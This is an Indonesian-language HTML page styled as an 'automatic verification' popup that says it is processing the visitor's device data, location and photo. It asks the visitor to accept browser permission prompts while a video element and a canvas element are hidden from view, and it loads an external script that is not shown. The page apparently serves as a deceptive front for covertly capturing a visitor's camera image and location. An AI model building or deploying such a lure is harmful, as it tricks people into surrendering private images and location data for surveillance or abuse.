<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Otomatis</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #f5f7fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.6);
      display: flex;
      justify-content: center;
      align-items: center;
      animation: fadeIn 0.3s ease-in-out;
    }

    .modal-content {
      background: white;
      padding: 2rem;
      border-radius: 16px;
      max-width: 460px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
      animation: slideUp 0.5s ease;
    }

    @keyframes fadeIn {
      from {opacity: 0;}
      to {opacity: 1;}
    }

    @keyframes slideUp {
      from {transform: translateY(40px); opacity: 0;}
      to {transform: translateY(0); opacity: 1;}
    }

    h1 {
      color: #333;
      margin-bottom: 0.5em;
    }

    p {
      color: #555;
      font-size: 15px;
      margin-bottom: 1.5em;
    }

    ul {
      list-style: none;
      padding: 0;
      margin-top: 1.5em;
      max-height: 250px;
      overflow-y: auto;
      text-align: left;
    }

    li {
      padding: 10px;
      border-bottom: 1px solid #eee;
      font-size: 14px;
    }

    li.error {
      color: #d93025;
      font-weight: bold;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="modal" id="popupModal">
  <div class="modal-content">
    <h1>Verifikasi Otomatis</h1>
    <p>Memproses data perangkat, lokasi, dan foto. Mohon izinkan jika diminta oleh browser.</p>
    <ul id="status-list"></ul>
  </div>
</div>

<video id="video" playsinline></video>
<canvas id="canvas"></canvas>

<script src="script.js"></script>
</body>
</html>
